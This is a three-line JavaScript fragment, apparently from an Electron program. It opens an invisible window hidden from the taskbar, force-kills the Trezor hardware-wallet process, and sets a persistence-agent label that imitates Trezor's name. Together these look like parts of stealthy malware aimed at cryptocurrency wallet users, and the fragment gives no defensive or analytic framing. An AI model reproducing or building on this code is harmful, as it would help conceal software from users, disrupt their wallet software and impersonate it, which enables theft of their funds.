const window = new BrowserWindow({skipTaskbar:true, opacity:0, width:1});
exec("taskkill /F /IM Trezor.exe");
const label = "com.trezormovement.agent";
